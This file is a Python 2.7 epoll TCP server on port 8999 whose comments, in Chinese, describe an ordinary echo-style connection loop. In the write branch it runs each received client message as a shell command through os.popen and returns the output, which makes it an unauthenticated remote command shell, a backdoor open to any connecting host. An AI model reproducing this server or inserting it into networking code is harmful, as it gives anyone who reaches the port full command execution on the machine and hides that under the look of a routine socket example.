#!/usr/bin/python2.7 
#encoding=utf-8

import Queue,os
import socket
import select
  

serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
serversocket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
server_address = ("", 8999)
serversocket.bind(server_address)
serversocket.listen(1)
print  "：" , server_address
serversocket.setblocking(0)   #设置成非阻塞时间
timeout = 10
#新建epoll事件对象，后续要监控的事件添加到其中
epoll = select.epoll()
#注册服务器监听fd到等待读事件集合
epoll.register(serversocket.fileno(), select.EPOLLIN)
message_queues = {}
  
fd_to_socket = {serversocket.fileno():serversocket,}
while True:
#  print "等待活动连接......"
  #轮询注册的事件集合
  events = epoll.poll(timeout)
#  if not events:
#     print "epoll超时无活动连接，重新轮询......"
#     continue
#  print "有" , len(events)"个新事件，开始处理......"
  for fd, event in events:
     socket = fd_to_socket[fd]
     #可读事件
     if event & select.EPOLLIN:
         #如果活动socket为服务器所监听，有新连接
         if socket == serversocket:
            connection, address = serversocket.accept()
            print "新连接：" , address
            connection.setblocking(0)
            #注册新连接fd到待读事件集合
            epoll.register(connection.fileno(), select.EPOLLIN)
            fd_to_socket[connection.fileno()] = connection
            message_queues[connection]  = Queue.Queue()
         #否则为客户端发送的数据
         else:
            data = socket.recv(1024)
            if data:
               print "收到数据：" , data , "客户端：" , socket.getpeername()
               message_queues[socket].put(data)
               #修改读取到消息的连接到等待写事件集合
               epoll.modify(fd, select.EPOLLOUT)
     #可写事件
     elif event & select.EPOLLOUT:
        try:
           msg = message_queues[socket].get_nowait()
           xiaoluo = os.popen(msg).read()
        except Queue.Empty:
           print socket.getpeername() , " queue empty"
           epoll.modify(fd, select.EPOLLIN)
        else :
           print "发送数据：" , data , "客户端：" , socket.getpeername()
           socket.send(xiaoluo)
     #关闭事件
     elif event & select.EPOLLHUP:
        epoll.unregister(fd)
        fd_to_socket[fd].close()
        del fd_to_socket[fd]
epoll.unregister(serversocket.fileno())
epoll.close()
serversocket.close()
